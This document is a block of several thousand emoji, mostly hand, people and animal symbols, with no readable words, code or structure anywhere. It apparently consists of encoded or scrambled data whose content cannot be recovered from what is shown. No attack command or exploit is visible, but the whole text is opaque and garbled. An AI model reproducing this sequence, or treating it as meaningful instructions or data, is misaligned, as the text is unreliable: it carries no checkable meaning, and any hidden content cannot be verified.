👆👐👍👑👪👚🐾👟👑👄👥👟🐪👌👡🐽👮👉🐩🐽🐾👋👢🐬👅👙👎👚👯👍👤🐨🐫👘🐩👈👯👌👏👟👎👎🐾👯👌👍🐧👛👦👚🐽👌👮👍👋🐽👏👉👤👯🐧👋👍👑👆👎🐽👁👪👊👣👟👎👄👡👍👩👍🐾👯👂👛🐾👉🐼👋👣👟👟👄👍👧👰👍👡🐹👘👊👤👈👰👋👢👑👟👉👥🐹👆👌👤🐬🐺👄👣👑👨👊👥👧 👣👉👢🐬👀👌👤👫👘👙🐽👁👫👌👤🐰👑👍🐼👑🐪👐👡🐽👘👎🐼🐨👌👌👤👟👅👘👱👌👮👍👤🐨🐧👘🐨👣👎👊👏👣👟👉👱👣👍👍👢👍👂👋🐽👑 👏👜🐾🐽👡👄👍👑👰👎👢👛👦👋👣👑👌👉👋🐹👎👍🐼👑👭👐👡👁🐾👚🐨👅👪👘🐽👑👠👍🐩👟👏👎👎👯👦👋👤👍🐾👎👏👛👏👙🐿🐹👩👋👍👑👮👜👍👧🐽👍👋🐽👟👍👢👧🐨👌👍👟👢👍🐨👁👪👚🐽👉👍👍🐼👑👟👐🐩👪👯👍🐨👛👩👅👍👛👊👘🐪🐹👑👍👤🐧👮👜🐾👀👰👍👥👅👏👙👣👁👆👍👣👑👮👚🐨👑👫👜🐾🐽👣👙🐽👧🐧👑👌👟👢👘🐽👑👫👌👢👟👍👄👎👟🐪👍🐧👑👑👜👣🐽👩👘🐽👛👟👘🐪🐹👈👍👤👧🐾👌🐩👉👎👍👥👅👉👙🐾👉👧👍👤👫👮👍👣👐👯👑🐻👉👠👄👢👣🐫👐👢👑👢👐👍👁👪👎👣👅👑👙🐽👑👟👐👡🐽👊👎🐾👉👀👑🐽👉👎👙🐽👐🐨👎👢👍👡👅👍👐👰👊 👣👑👡👉👎👯👟👍👣👛👊👛👣👑👨👊👢👫👋👉👣👑👰👋🐨👑👎👍🐩👁👀👈👡👑👎👙👏🐹🐿👎👍👑👢👎🐽👁👩👑🐾👟👊👘👱👍👮👍👎🐧🐨👈👢 🐨👎👎👏👟👏👙🐾👉👘👍👡🐹👎👅🐽👑👏👅👍👅👍👄👢👧👰👋👣👑👪👎👤🐼👯👚🐾👟👎👄🐽👧👱👍👣👑👆👚🐨👅👩👅👍👅👠👉👤👫🐬👍👣👚👯👄🐼🐨🐿👉👥👁👅👍👤👯👊👐👋👅🐺👎🐽👣👪👘🐾🐰👎👉👤👯👏👍🐩👫🐧👘👢🐨👩👅👌👟👑👘🐨👧👭👍👡🐸👮👜🐽👅👫👆👍👟👟👄👌👧🐻👍🐽👑👢👋👤👍🐾👚🐼👣👋👙👎👟👋👋👋👁👦👍👍👑🐾👍👤🐽👢👄👢👑🐿👍🐩🐬👊👋👣👅🐿👘🐽👛👌👍👣👑👱👋👢👑👘👎🐼🐬👍👆👍👟👊 👄🐿🐹👏👍👡👁🐫👘🐨👑👫👊👣👣👟👉🐼🐬👍👍👣👑👮👘🐽👐👮👍👋🐽👎👙🐽👁👱👎👢👌🐨👘🐼🐧👮👊👢👫👎👄👍👧👏👍👡🐽👍👜🐽👛👪👘 🐽👉👠👉🐪👟👭👍👎👧👂👙🐨👛🐾👙🐿👁👏👙👤👉👎👌👤👯👮👜👣👐👰👛🐻🐹👟👘👱🐽👏👐🐧👟👪👍👎👁🐾👚🐿👁👑👍👤👉🐾👑🐻🐽👢👎👎👅 🐾👑🐾👣👏👉🐩👟🐫👍🐩👫👊👈👤👍🐾👎👏👟👍👙🐾👯👦👌👤👯👮👎👍👍👨👊👤🐰👏👙🐾👉👐👋👍👟👮👋👣👑👪👚🐽👟👑👘🐩👟👃👎👍👑👂👅👤👁🐾👘🐽👧👟👄👏🐸👱👎👣👛🐫👎👤👍👍👅👍👟👢👉👣👑👦👑👎👫👘👎👍👛👌👈👤🐰👡👄👍👣🐪👋👍👟🐾👌🐩🐼👰👘🐾🐽👎👘👢🐬 👭👐👌👑👩👜👌🐨👍👆👍👅👎👘🐪🐹🐭👎👍👍👢👙🐨👉👪👑🐼👑👋👙🐼👧👏👐👣👟👊👚👣👉👩👎👥👅👏👉👣👁🐨👍👎👯👎👘🐼🐨👎👚🐽👣 👏👍🐪👉👩👍👋🐽👘👉🐨👍👪👍👣👉👠👍🐾👯👮👍🐽👑👘👛🐩👍👎👎👣👟👢👉🐼👁👎👋👌👉🐾👎🐽👣👩👌👣👅👎👄👌👦🐩👍👤👯👦👍🐩👁👌👉👢👯👍👙👏👟👇👐👱👁🐾👉🐨👛👫👙🐽👅👟👄🐧👁👘👍👤🐨👮👉🐨👣👎👙🐽👛👋👎🐾👟👧👌👢👑👮👍🐽👣👪👑🐻👉👌👄👍👧👯👌👤👫🐧👍🐽👑👫👌👣👣👘👉👎👄🐨👍👋🐸👯👍🐩👅🐽👙🐽👑👠👉🐩👟🐩👎👍👛🐫👋🐨👁👩👅👍👛👘👉👥🐹👧👌👤👫👮👊👍👑👫👛🐾🐽👏👙👍👑👐👍 👤👫👦👘🐨👀👱👈👥🐹👍👙👋👍🐻👍👡🐽👘👎🐼🐨👌👌👤👣👅👍👣👐🐨👍👎👯👦👛🐨👍👫👊👣👑👏👙🐾👟👏👐👣👉🐾👌🐨👉👍👎👥👛👊👍👢👧👱👐🐧👛🐫👍🐩🐽🐭👍👡👑👏👍🐪👉👟👎👍👛🐾👍🐨👅👐👙🐾👟👊👜👤👯👐👍👤👧👆👌🐨👛🐾👑🐽👛👘👉👋👣👨👋👍👑👮👄👍👍👫👜🐽👅👟👉👋🐹🐫👌🐩👯👘👍🐩👁👌👉👋🐹👍👜👢🐽🐫👌👡👁👂👉🐨👛👪👘🐾👟👣👙👏👟🐩👍👣👛👮👉🐨👣👏👍👥👅👏👎🐾👯👨👌👡🐹👘👎🐽👉👍👌👢👛👏👍👣👧👏👐👌👛🐧👎🐽👁👪👚🐻🐹👎👍🐪👟👇👎👍👑👘👚🐩👅🐿👘🐽👧👅👙👤👞👱👍👎👧🐾👛🐨👀👰👉👢👛👌👘👱👍👆👐👣👛👡👜🐽👑👫👄👋👉👟👄🐻🐽🐿👍🐨👟👦👍👍👛🐿👘🐾👟👍👙🐾👉👋👍👡🐽👪👚👣👧🐾👋👣👟👎👙👏👞👮👍🐽👑👘👋🐩🐽👩👄👍👛👡👉🐼👁👟 👍👣👛👦👌🐽👑🐼👉👤🐽👢👍👢👑👱👎👢👑👮👍🐨👐👯👉👡👅👎👘👢👁👟👌🐩🐨👉👜👍👉👩👎👤👟👊👙👢👁👇👍👎🐧🐨👈🐧🐨👪👎👥🐽👋👙👥🐹👪👌👤👪🐨👊🐽👑👫👅👍👛👏👉🐧👧👀👍👎👪🐬👎👤👁👌👉👥👑👑👘👢👑👟👐🐨👑🐾👛🐽👁👪👑🐼🐬👟👜👣👐🐩👍🐨👉🐺👍🐩👀👯👍👏👣👋👘🐩👟👎👐👢👛👦👍👣👑👫👜🐾🐽👅👄👍👧👐👑👌👛🐾👘👢🐨👐👈👢👧👏👘🐨👧👋👍🐾👯👘👎🐾👉🐭👈👣👛👎👉👍👧🐩👎👏👧🐾👍👤👍👎👊👣👣👠👉🐩👟👌👌👣👍👮👎🐽👛👏👜🐾🐰👌👙👍👑🐿👐👋👅👢👎🐾👁👩👅👍👟👎👙👏👉👟👋👍👑👢👚👣👑👌👉👤👟👎👘🐪🐸👯👍👍👑👦👘🐨👐👯👊👥👅👡👉👣👁👎👍👢👍👘👘🐽👢👰👚🐪👟👎👄👎👉👰👋👣👑👢👌🐩🐼👱👈👣👧👎👙👋🐹🐪👑👌👛👁👜👍👑👬👋👣👟👠👙🐼👧👇👍👤👯👘👛🐩👄👯👎👥👉👣👉🐧👑👪👐👢👑👪👅👍👧👍👘🐾👫👟👉👣👧🐧👍👎👫👦👍👢🐨👏👘🐻👅👎👄🐽👧👟👐👱🐽👢👛🐾🐽🐾👑🐾👟👟👄🐧👁👍👍👣👉🐺👐👍👣👏👋👥👅👘👊🐽👁👩👌👤👪🐨👋🐨👉👍👍👥👛👎👙🐽👣🐫👎👢👉🐺👘👌🐨👍👍👡👅👌👙🐽👑👩👍🐧👛👂👉🐨👛👪👍👣👛👅👉🐨👁👌👍👣👍👘👐👎👅👎👉👥👍👘👉👣👁👏👐👢👑👑👄👍👛👩👍👤👧👆👍👣👣🐬👌🐩👯👘👘👣👁👏👜🐾👟👎👙🐾👉👋👑🐾👯👘👚👍 👅👩👛🐽👉👊👙🐽👧🐬👍🐻🐽👘👍🐨👐👰👊👢👣👉👘👣👧👏👐👣👟🐺👊🐽👛👎👎👤👫👏👉👢👧👰👐👌👛👮👌🐧🐨👬👘🐽👣👎👘👢👁👏👌👱 🐽👆👉🐨👛👬👌👤👯👊👄🐨👁👈👍👎👧🐺👍🐧🐬🐾👎👣👟👆👍👋👣👐👌👤🐨👊👊👍👧👍👐👱👍👎👙👌👍🐫👍🐩👧👆👍🐧🐨🐾👚🐽👉👎👘👢 👑👩👑🐽👑👮👊🐾🐽🐾👋👤👣👊👙👏👈🐨👍👤👯👡👜🐼🐨🐿👌👏👣👋👘🐩👉👌👐👤👪🐨👍👍👣👏👛🐾🐽👏👉👤👯👱👐👌👚🐬👍👍👁👫👜🐽👟👎👄👥👈👮👐👎👪👯👚👢🐬👍👘🐽👧👟👄👏🐹🐩👍👤👧🐹👛🐩👍🐾👋👥🐽👋👙🐾👉👏👐👢👍👮👊👍👛👎👌👢👛👏👙👍👑🐿👐🐧👍👪👍🐾👁👏👘🐽👉👌👍🐼👑👃👍👣👑👘👉🐨👑👫👉👤👫👅👘🐨👧👀👍👡👀🐨👌🐨👉👪👋👢👟👟👉👤👉👍👍👤👯👍👜🐽👐👮👎👣👧👣👍🐨👑👀👋🐨👛👦👋👣👑👏👆🐿👣👏👍🐪👉👨👋👣👑👘👍🐨👛👬👋👣👟👟👘👱👍👎👍👤👯👘👛🐩👍👪👎👥👉👣👉🐪👉👨👋👍👑👂👜👣👛👩👎👤👫👟👍👢🐬🐾 👌🐩🐨🐾👍🐧🐨👎👚🐽👟👎👘👢👑👎👑👌👑👢👛👍👅👩👅👍👛👠👍👢👧🐫👍👣👉🐺👍🐩👈👯👑🐼👛👠👊🐼👧👐👐👤🐨👊👍👍👍👫👅👌👅👊👄👍👣🐬👑🐼👉🐺👘🐼🐨👍👙🐻👅👌👙🐽👑👩👍👣👛👂👉🐩👅👀👊👣👛👊👄🐩👟👦👍👡🐹👢👌👤👍👫👋👢👛👘👉🐩👯👐👌👡👁👦👍👣👑👪 👘🐿👛👉👙👍👑🐿👍🐾👫👢👍🐾👁🐿👜🐾🐰👍👘👢👁👟👍👢👑👘👚👍👅👫👆👍👛👠👉🐨👁👑👎👢👍👢👄🐾🐽👍👄👏👁👠👉🐽👁👏👐👣👉👎👍🐽👑🐿 👜🐾🐽👆👙👌👧👀👌👤👯👢👘👍👛🐿👑🐪👧👏👙🐽👧👟👎👍👛👊👉👢🐨👎👎👤🐽👊👙🐽👧👭👎👣👛🐧👐👍👛👎👑🐽👍👉👙👋👣👨👋👍👑👪 👄🐨👉👎👘🐼👛👍👄👢👍🐬👐👌👛🐾👍🐩🐽👩👅👏👑👑👍👍👧👰👑👍👌👯👍👢🐰👎👋👣👛👟👄👎🐰🐪👍👣👚👯👅🐽👈👯👎👏👛👅👍👣👧👐👍🐧👟🐺👎🐽👣👪👘🐾🐰👎👉👣👐🐩👌👤👫🐧👘🐨👁👪👚🐻🐽👎👉🐪👟👇👐👍👑👁👜👤🐽🐿👆👍👛👎👜👢👀🐧👎👎👧👂👋🐨👀👯👎👥👍👍👙 👏👟👌👌👡🐽👂👛🐨👑🐾👎👤👫👍👄👎👉🐿👍🐩👯👦👘🐨👁🐽👊👣👛👌👍👍👁🐿👍🐨👑👘👎🐾👉🐿👆👍👛👟👜👢👐👯👎👍👍👦👛🐨👛🐾👎👥👅 👡👉👏👉👟👍👡👅👦👊🐽👣🐭👉👣👛👡👄👏🐹👀👐👌👛👦👙🐾👁🐾👙🐻👍👎👙👋🐽🐪👌👡🐽👪👎🐽👁👐👘🐾🐽👊👍🐩👟👐👎👍👉👂👙🐨👍👎👎👥👉👢👊🐾👉👍👋👍👑👮👄🐽👧🐽👘🐾👫👎👉👣👧👱👐🐧👟👮👎🐽👛👀👈👢👟👎👘🐨👍🐫👍🐧👑👎👚👤👁🐾👎👢🐬👠👙🐼👧👭👍🐨👑👢 👅🐽👈👯👊👥👁👆👍👤👉👟👌👤🐬🐺👚🐽👍👫👛🐿👛👋👍👣👧🐧👑🐼👛🐾👘🐧🐨👏👌👢👣👎👙👏👉👱👍👣👛👂👊🐽👍👬👈👣👑👟👘🐨👧👄👍🐾🐨🐫👐👎👅👪👘🐪👧👟👉🐩👯👆👍👤👯👑👄🐽👑👨👊👡🐹👑👍👤👉👀👌👤🐬👆👘👣👁👫👘🐽👟👑👍🐼👑👟👑👍👑👮👍👣👛👬👋👣👛👎👘 🐪🐹🐭👎👋🐹👢👅🐽👌👰👊👣👛👋👙👌👑👐👍👢👍👂👘🐽👛👎👑🐼👛👎👄👎👉👑👐👢👛👦👌🐩👁👏👘🐽👧👏👍🐪👉👩👍👎🐨👉👜🐽👧🐾👑 🐽👟👠👘👱👍👐👍🐽👛👱👄👍👅🐾👎👏👣👣👉👱👣👦👍👤👫👪👅🐽👌👰👅👎🐰👎👄👌👧🐧👍👍👟👢👎🐽👑👪👚🐼👫👘👍👍👧👏👍🐨👛🐾👉🐩🐽🐿👙🐽👟👊👘🐪🐸👱👍👤👯👢👛🐨🐼👰👌👏👟👘👊🐼🐬👧👌👤👯👮👍🐨👣👪👍👤🐽👏👉👣👁👎👍👎👫👢👎🐽👑👪👚🐽👟👑👍👎👈👮👍🐧👑👂👚🐩👅🐼👈👣👛👎👄🐩👟👈👍🐨👑👘👐👎👄👰👋👢👟👟👉👥🐹👆👐👤🐨👥👜👣👑👏👚🐼👛👢👄👌🐬👀👌🐩👫👦👘👍👁👩👅👍👣👍👙🐽 👑🐪👍👋🐽👘👛🐼🐨👀👑🐾👯👊👍🐽👑👁👍👎👯👦👙🐨👐👯👑🐼👟👟👉👤👯👘👐👣👟👅👜🐽👑👨👉👥👅👡👙🐿🐹👀👋🐨👛👮👘👍👁👪👎👏👧 👎👄👥👉👟👍🐻🐽👑👜🐽👅👬👋👣👉👠👉🐩👟👐👍🐽👛👮👍🐨👍🐾👎👢👍👊👙👌👑👩👍👤👫👘👜👣👛👩👎👥👛👎👄👍👣🐫👌👤👧👆👍🐩🐽👩👊👤👟👍👄👡🐽👊👑👍👑👊👚👣👛👫👘🐽👅👠👘🐧👧👈👍👣👚👮👄👍🐼👮👄👏👅👏👙👢👑👌👐👤🐬🐺👚🐨👍👫👚👱🐽👋👍👣👑🐧👑🐼👛🐾👘👍👁👩👚🐻🐹👎👍🐪👄🐨👍🐩🐨👂👍👍👁👬👎👣👧👟👘🐨👧👦👎👋🐽👘👉🐩👉🐾👊👥👅👘👉👋👍👦👑👎👯👑👄👣👐👯👌👢👅👎👄👢👣🐫👍👣👟👪👍🐾🐼👰👘🐽👛👑👘🐩👉👭👍👤👯👘👛🐾👍🐿👉👢🐬👅👍👥🐹👑👎👣👍👢👉🐩🐽👩👄👍👛👏👙👤👯👐👐👋👁👊👛👣👑🐿👜🐾🐽👎👍 👢👧👍👌👎👯👢👍🐨👁👎👚🐻👁👏👍🐪🐹👃👌👡👁👅👜🐽👉👬👋👤👟👊👙🐿🐹👮👍👤👧👂👙🐨👛🐾👑🐽👟👣👉👱👣👍👐👣👑👘👊🐽👐👯👘🐾👫👏👉🐧👧👁👌👎🐬👂👍👍👑👪👚🐻👅👘👍👣👧🐪👌👤👯👘👍👍👁👫👘🐽👛👟👄🐧🐽🐫👍👣👑👘👙🐩🐼👯👑🐼👟👋👘🐩👉👐👐👤👫👘👍👣👣👩👑🐽👅👊👄👏🐹🐽👌👍👟👦👍🐧🐨👏👌👥👣👌👙🐽👧👩👍👋👁🐽👜👣🐽👪👚🐽👛👠👍🐼👀👱👎👣👍👢👊👤👍👎👍👥👍👌👙🐾👟👐👌👡🐽👂 👎👣👛👏👜🐾🐰👍👄👍👧👏👍👤🐬🐾👌👤👁👍👎👣👍👑👘🐨👧👟👋👌👑👮👍👣👧🐽👑🐾👟👊👙🐿🐹🐬👎👎👫👊👌🐨👑👫👊👢👟👟👊🐼👧👏👐👎👫👮👋🐽👑👪👎👢👫👎👍👢👑👱👐🐧👛🐫👘🐼🐧👮👊👣🐽👎👄👥👟👏👎👍👛🐽👜👍👍👪👑🐽👛👠👘👱👍👎👎👎👯👢👅🐽👑🐾👌👣👛👎👙👤👉👏👐👢👑👪👅🐽👛👩👌👢👅👎👄🐻🐽👱👌👤👧👊👎🐾🐼👰👘🐽🐹👎👄🐾👉🐾👑👍👛🐾👊👍👉👪👎👤👟👟👜👣👑🐽👍👤👯👎👐👍👣👏👌👢👟👎👘🐩👯👍👐👏👧👪👍🐽👣👩👑🐻👅👅👍👣👧👀👑👌👑👘👋🐨👐👮👎👢👣👍👄👥👉👟👐👎👯👂👛🐾👍🐿👉👣👛👠👉👥🐸👱👎👢👛🐫👐 👎👅👎👋👥👁👘👉🐪🐹👦👑👎👯👘👎👍👑👩👐🐪👟👊👄👍👍🐫👌🐩👯👢👘👣👁🐾👚🐽👟👑👙🐾👟🐻👌🐧👑👢👍🐨👛👫👛🐽👟👊👘🐪🐹🐬👍🐩👫👢👙🐨👌👰👉👡👑👎👙👤👉👏👍👥👧🐹👜🐽👍👏👚🐪👟👡👄👎👉👑👐👌👑👦👘👍👀👯👊👤👟👎👙👏🐹🐻👍👡🐸🐨👉🐨👛👪👘🐼🐰👎👍🐾👯👑👍👎🐧👯👌🐨👅👎👚🐽👑👑👜👣👑👏👐👣👍👎👅🐽👐👰👚🐼🐰👎👄🐻🐽🐿👐🐧👑👊👍🐩🐽👩👎👥👁👘👉👣👧🐪👌🐧👛🐾👉🐨👉👫👙🐽👅👠👎🐽🐼👯👍👤🐨🐫👘👤👍🐽👄👌👑👅👍👎👟👋👐👤👫👮👋🐨👑👫👄👍👅👎👍👤👯👐👑🐼👛🐾👎🐽👁👪👚🐿👟👎👉👱🐸🐨👍👤👯👂👛🐾👍🐾👘🐽👛👅👙👣👀👱👎👎👫👘👊🐩👅👩👅👍👍👊👙🐾👟👦👋👍👟🐺👜👍👛👎👎👤🐽👟👄👌👣🐫👍🐾🐬👆👘👍👁👫👌👥🐹👎👘🐨👑👂👋👌👑👘 👚🐨👢👱👘🐽👛👅👍👎👮🐧👎👋🐹👎👚🐨👐👰👊👢👑👆👎🐼👁👎👐👢👛👦👉🐽👧🐼👉👤🐽👢👉🐨👑👀👌👤🐨🐧👋👤👁🐽👚🐻👑👎👘👢👦👮👐👋🐽👪👍🐨👉👩👙🐽👁👟👜👤👯👐👎👍👛🐧👐👎🐽🐾👚🐽👟👣👉👥🐹👪👌👡🐹👘👊👣👑🐿👜🐽👛👌👙🐽👧🐨👌👎👧👎👍🐨👀👱👘🐿🐽👌👙🐽 👧👟👍👡🐽👢👛👍👉👪👘🐾👟👟👜👣👑👏👍👤🐨🐫👐👎👈👰👉👢👛👏👎🐾👉👏👍👢👍👘👎🐽👣👩👎👢👫👣👙🐾👉👰👍👣👉🐾👘🐽👁👌👈👡 👅👍👄👥👈👮👍👡🐸👯👍🐩👅🐾👘🐽👛👟👘🐨👧👏👎👣👍👘👘🐩👄👰👉👢👛👍👙👎👟👆👐👢👍👮👅🐽👑👪👑🐿👛👋👄👢👣🐫👍🐨👟👦👍👤👁🐾👚🐾👟👍👙👏👄👯👍🐨👑👎👛🐾👍🐾👑🐼🐬👅👍👤👮🐨👎👢👍👊👈🐩🐽🐽👄👍👑👠👉🐼🐬👍👐👢👑👘👚👣👑👪👑🐼👫👊👄👢🐬👁👌🐩👯 👢👌🐧🐧👰👘🐾🐰👎👘👢👁👩👍👎🐨👎👛🐽👉👩👑🐾🐽👊👄👥👟👑👍👎👧👂👙🐨👑👪👎👥👅👟👊🐾👉👊👐👣👑👘👊🐽👑🐿👛🐾👫👎👉🐧👧👀👑👌👚🐬👍👤🐽👩👊👤👟👎👘🐨👧👟👐🐨👑👆👛🐼🐰👎👑🐾👣👊👄👌👧👘👍🐩👫👎👘🐧🐨🐿👉👣👑👅👎🐼👧👧👌👢👑👂👎🐽👣👪👌👣👛👎 👉👣👧👀👑👌👛🐾👋🐩👁👍👚🐼👣👍👙👏👟👩👐👍👑👘👉👣👑👐👑🐽👛👠👍🐼👌👮👍👤👧👂👌🐨👁👩👅👍👛👟👉🐪👉👋👐👢👑👮👛👣👛👪👑🐻🐹👑👍👤👉👏👎👢👑👦👘🐨👁👩👅👍👑👌👍👣👧👱👋👋🐽👊👍🐩🐽🐽👑🐽👛👅👘🐨👐🐩👎👍👍👢👉🐨👛👪👎👢👑👏👘👢🐬👏👌👣👑👮👄 🐨👍👫👜🐾👫👡👄👏🐹👀👑🐼👑👢👋👣👅🐽👊👢👫👎👙🐾👅🐫👋👢👑👉👜🐽👛👐👑🐼🐬👎👙🐿🐹👑👍👡🐹👦👈🐨👛🐾👙🐿👅👟👉👱👣👏👌👤👯👑👄👣👍👫👛🐻🐹👟👄👌👧👱👐🐧👉🐾👍🐨👀👱👘🐽🐹👑👍👤👉🐾👑👌👛👆👉🐩👅🐾👘🐽👛👅👄👌👧🐬👍👤👯👊👊🐨👈👯👊👏👟👏👙👣👑👋👐👢👌🐨👙🐨👉👎👘🐼👅👣👍👣👧🐿👍🐩🐨🐧👍👢🐨👏👌👢👟👎👄👥👟👭👐👋🐽👂👉👣👅👪👑🐽👍👎👍👢👧👀👍👡🐹👘👚🐩👅👪👍👥 👅👌👙🐾👉👆👍👣👚🐫👜👍👑👫👄👋👉👉👄👎👉🐿👍🐩🐬👆👘👣👁👐👌👤👟👎👙👋🐽👋👌🐧👑👎👛🐾👅🐭👍👣👛👅👍👥🐹🐭👍🐩👫👍👄👍👉👫👊👣👟👟👉👋👣👏👐👣👉🐾👄🐨👍👨👉👥👅👏👉👢👧👑👐👌👛🐾👌🐨👐👰👘🐽👣👏👍👣👁👃👐👡🐽👎👍🐨👛👬👌👤👫👋👉🐨👁👎👍🐽👑👘👛🐧🐨🐾👚🐼👑👟👉🐪👉👏👌👤👯👮👜👣👢👮👘🐿👛👏👉👤👉👁👌👎👫👦👍🐩🐼👯👍👡👉👎👄🐽👧👏👐🐩🐨👂👉🐨👛👩👅👎👣👠👉👏🐹🐩👍👡🐽👘👘🐧🐬🐾👌👏👟👋👙👢👧👇👍👤🐨👊👙🐨👍👫👅👌👅👡👉👣👑👯👌🐩🐧🐬👍🐨👑👪👚🐼👟👎👍🐪👉👩👐👋🐸👯👍🐩👁🐼👌👣👟👟👄 👤👟👌👎👍👉🐾👊👤👍👪👉👥👍👉👙🐽👧👦👐👋🐽👮👋👍👑🐿👄👋👉👑👍🐧🐬👱👐🐧👍👎👍👤👁👏👜🐼🐰👎👙👏👟👘👋👍👑👘👎🐾👍🐿👆👎 👧👅👘🐨👐🐨👍👤🐧🐨👊🐨👛🐿👊👢👟👣👉👤👟👘👐👢👛👦👛👣👣👍👎👥👅👎👙🐾👉🐨👎👢👑👆👍🐩🐼👱👈👏👛👏👘🐨👑👟👍🐻🐽👊👚🐨 👛👐👘🐽👉👟👙🐼👧👐👎👍👛🐧👛👢🐨🐾👍👡👑👊👙👏👉👋👋👍👌🐨👎👣👣👩👑🐾🐰👍👄👢👧👐👐👌👑👪👎🐽👐👱👘🐿👑👎👍🐼👑👩👌👡 🐽👮👉🐨👧🐿👉👣👅👎👉🐪👟🐫👍👢👑👘👐👎👈👮👄👍👛👎👙👣👁👪👌👣👉👪👙🐨👑👫👛🐿👅👆👉👣👍🐬👋👣👚🐬👍🐧🐨👍👚🐻🐹👎👍👤👟 👩👍🐧👑👘👚🐩👅🐽👛🐾🐽👎👍👥🐹👐👍👡🐽👢👉🐨👀👰👉👢👟👠👉👤👟👋👐👋👅🐹👜👍👑👫👜🐾👫👢👄👌👣🐫👐👢👑👦👍🐩👁👩👅👍👣 👎👄🐾👈🐧👐👱🐽👎👚🐨👧🐾👋👣👟👊👙🐼👧👑👎👢👍👘👘🐨👈👯👊👥👉👢👉🐼🐬👐👐👋👁👅👄👍👐👮👎👢👫👡👄👢🐬🐽👌👎👯👢👍🐧🐧 👰👘🐽🐽👎👄👍👧👟👎👍👛👅👜👍👉👩👘🐾👟👊👙👢👁👇👎👎🐧👯👙👤👍👪👎👣👟👡👉👎👉👩👋👍👍👪👅👍👍👫👛🐾👫👎👍🐧👐🐩👍👤👪 🐬👎👤👁🐿👌👥🐽👘👍👍👧👟👑🐼👌👯👍👍👍👫👘🐼🐬👠👉👍👢👮👍👣👛🐫👙🐩👀👰👉👣👛👋👙👣👁👦👌👤👯👮👐👍👑👩👍👥👛👎👉👣👣🐪 👍🐩🐬👆👘🐨👀👯👎👢👛👘👉👎👉🐪👍🐾👯👘👚🐨👛👐👚🐽👛👅👙👣👁👦👍👢👉👂👉🐩👅👩👄👍👛👟👉🐪👟👌👌👡👅👦👎👍👑🐾👐👱🐽👠 👄👢🐬👱👍🐩👫👎👌🐩👁👍👎👥👁👎👙👏👉👟👑👎👯👢👚👣👛👬👑🐽👛👅👍👤👮🐧👍👎🐨👮👋🐨👐👰👉👥👁👋👙👎👟👎👋👎👧🐾👌🐨👧👎👎 👣👅👡👙🐾👉🐧👐👌👑👆👘👎🐼👮👚🐽🐽👎👙🐾👅🐪👋👍👑🐽👛🐧🐨👐👋👣👟👠👘🐨👧👍👎👎🐧🐨👈🐩👄👯👍👥👉👡👜👢👑👌👍👤👯👘👄🐽👧🐽👑🐼👛👟👍👢👧👰👐🐧👉🐺👍🐨👑🐭👈👋🐽👎👄👥👟👟👌👤👪🐨👍👣👍👪👎👢🐬👎👙👢👁🐬👍👤🐨🐫👐👍👈👰👋👣👛👎👙👣👁👦👌👣👉👎👙🐨👧👏👜🐽👛👅👄👍👧🐧👋👌👟👦👋👣👀👮👍👡👉👑👘🐨👧👩👍👢👑👢👊🐾👍🐿👆👍👑👠👙👢👁🐭👍👤🐨🐫👐👎👅👪👎👥👁👢👉👣👑 👋👐👢👟🐺👎👣👛👪👍👤👫👊👄👢👑👰👋👍👑👪👌👤🐼👱👈👣👣👑👍🐼👑🐪👍👌👑👘👊🐾👍🐿👉👤👫👊👄👌👢👰👍👎🐨🐫👘🐩🐽🐽👄👍👣 👉👘👢👧👐👍🐧👟🐺👊🐽👑👫👄👍👛👎👄👌🐬👱👐👢👛👪👌🐧🐨👫👘🐽👑👎👍🐪👟👏👑🐻🐽👢👉🐨👧🐾👘🐾👯👊👜👤👯👎👎👎👯👘👐👍👅🐾👙🐽👍👌👙👏👉👐👌👡🐹👮👊🐽👢👮👘🐼👫👎👍👣👧👱👐🐧👉👆👐👍👑👪👚🐻👅👍👙👏👟👟👍👣👑👂👛🐾🐽🐾👑🐾👟👅👄🐼👐🐧👍👤👯👘👘🐩👈👯👍👏👟👏👎🐾👟👐👐👋🐽👮👚👍👍👩👍👋🐽👎👄👍👧👰👍👤🐨🐾👘🐽👁👫👛🐻👍👑👜👢🐬👭👍👡🐸👯👎🐽👍👨👈👣👧👟👄👏🐹 👈👍👣👉👂👉👤👍👪👉👥👅👡👉👤👉👧👌👡🐸🐧👜👣👛👪👍👤👫👋👙👍👑👏👍🐩🐬👎👍👎👁🐿👘🐿🐹👑👎🐿🐹👏👍🐩👯👢👎🐾👍🐿👆👍👑👅👍 👥🐹👐👍👤🐧🐨👉🐨👌👰👊👣👑👏👙🐽👑👎👐👣👟👦👜👣👉👪👎👥👛👎👙👌👑👀👑🐼👑👢👋👣👁🐽👎👣👟👏👍🐼👁👟👐👡🐽👢👛🐽👁👬👊👢 🐰👎👉👋👍👐👍🐽👍👘👛🐨👣👎👚🐽👟👣👉👎👉👨👐👣👍👘👊🐽👛👩👑🐾🐰👟👉👋🐹🐪👌🐩👯👂👍🐩👁👌👉👡👅👍👘👢👑👘👑👍👑👎👚🐨 👧🐾👍👤👣👟👜👣👑👑👍🐨👛🐫👘🐧🐬🐾👎👢👛👍👙🐾👉👏👐👤🐨👊👎🐽👣👩👎👥👅👆👉👤👉👰👍👎👯👆👘🐽👑👌👉👥👣👑👘🐨👁👇👍👣 👛👂👉🐩👅👀👊👣👛👅👉🐨👁👄👎👏👧🐾👋🐩👅👩👆👍👛👏👙👎👟👆👍👤🐬🐺👛👣👐👯👑🐿👛👊👄👍👍🐫👍🐨👟👦👐👍👅🐾👎👣👑👑👎🐿🐹 👱👍👢👑👪👚👣👧🐼👋👢🐬👎👙🐿🐹👁👎👣👍👘👐👍👈👯👎👏👛👏👘🐩👯👎👋👎🐬👊👘🐽👣👏👜🐼👫👏👉👣👑👱👎👢👑👎👍🐧🐧👮👊👢👣👏👘🐩👈🐧👎👍👛👊👉👢🐨👎👎👤👫👊👙🐼👧👌👎👎👫👘👛🐧🐬👪👎👥👅👘👉🐽👁👘👍👤👯👂👜👣👌👰👅👍👛👍👙👌👧👐👐👌👑👪👎👤🐼👯 👚🐻👅👑👄👥👟👟👐🐨👑👂👚👢🐰👎👋👢🐬👎👍🐽👍🐫👍👤👯👡👜🐼🐨🐾👍👏👣👊👘👣👧👏👐👤🐨👊👎🐽👑👬👚🐼👁👣👉👣👑👐👐👱👅👦 👍🐧🐨👏👌👣👧👑👍👍👧👭👐👍👑👁👜🐽👅👫👘🐽👛👠👎🐼👁🐼👍👤👧🐹👄👍👀👯👑🐿👅👟👉👋👣👏👐👏👧👎👎🐽👑🐾👑🐻🐹👢👄👣👑👏👍 